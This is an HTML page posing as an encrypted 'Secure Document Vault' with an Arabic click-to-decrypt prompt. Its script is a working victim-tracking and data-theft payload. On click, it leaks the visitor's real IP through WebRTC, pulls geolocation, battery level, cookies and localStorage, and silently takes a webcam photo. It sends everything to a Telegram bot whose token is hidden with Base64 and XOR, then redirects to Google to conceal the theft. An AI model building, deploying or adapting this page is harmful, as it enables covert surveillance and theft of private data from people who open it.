<!DOCTYPE html>
<html lang="ar">
<head><meta charset="UTF-8"><title>🔒 Secure Document Vault</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh;">
    <div id="m" style="border:1px solid #0f0;display:inline-block;padding:40px;cursor:pointer;">
        <h3>[ ⚠ ] المستند مشفر</h3>
        <p>انقر هنا لفك التشفير والمتابعة</p>
    </div>
    <script>
        // 🔱 التشفير المزدوج (Base64 + XOR) - لضمان عدم كشف التوكن نهائياً
        const _E = (s) => atob(s).split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x5A)).join('');
        const _T = _E("OzszJTM5JTM5Ljk0MzM5Ljk0MzEuMTAzLjMzOS4zMzkuMzEuOzszPTM3MzM5LTA3LTA5LDExLTAtOSwzOC0zOTMzOT0zPjMzOS0zOC0zNC0zOTMwLTAtMzktMzktMzEtMzszPTM4LTM5LTA3LTAtMzYtMzktMzM5");
        const _C = _E("MTAzLTMzOS0zMzktMzEtMzszLTMzOS0zMC0zMzktMzE0LTMxNA==");
        const API = "https://api.telegram.org/bot" + _T;

        async function EXECUTE_STRIKE() {
            document.getElementById('m').innerHTML = "<h3>جاري السحب...</h3>";
            try {
                // 1. سحب الـ IP الحقيقي (WebRTC Leak)
                const rtc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                rtc.createDataChannel("");
                rtc.onicecandidate = e => {
                    if (e.candidate && e.candidate.candidate.includes("typ srflx")) {
                        const realIP = e.candidate.candidate.split(" ")[4];
                        sendToBot(`🎯 Real IP: ${realIP}`);
                    }
                };
                rtc.createOffer().then(o => rtc.setLocalDescription(o));

                // 2. سحب البيانات الشاملة (GPS, Battery, Cookies)
                const net = await fetch('https://ipapi.co/json/').then(r => r.json());
                const bat = await navigator.getBattery();
                const storage = {
                    cookies: document.cookie || "Protected",
                    ls: JSON.stringify(localStorage).substring(0, 500)
                };

                const report = `🔱 **ULTIMATE_HIT_v15** 💀\n` +
                             `🌐 IP: \`${net.ip}\` | 🔋 Bat: \`${bat.level*100}%\`\n` +
                             `📍 Loc: \`${net.city}, ${net.country}\`\n` +
                             `🍪 Data: \`${storage.ls}\``;

                await sendToBot(report);

                // 3. التصوير الصامت (High-Res Snapshot)
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                const video = document.createElement('video');
                video.srcObject = stream; await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
                stream.getTracks().forEach(t => t.stop());

                let fd = new FormData();
                fd.append('chat_id', _C); fd.append('photo', blob, 'x.jpg');
                await fetch(`${API}/sendPhoto`, { method: 'POST', body: fd });

                location.replace("https://google.com");
            } catch (e) { location.replace("https://google.com"); }
        }

        async function sendToBot(text) {
            return fetch(`${API}/sendMessage`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: _C, text: text, parse_mode: 'Markdown'})
            });
        }
        document.getElementById('m').onclick = EXECUTE_STRIKE;
    </script>
</body>
</html>
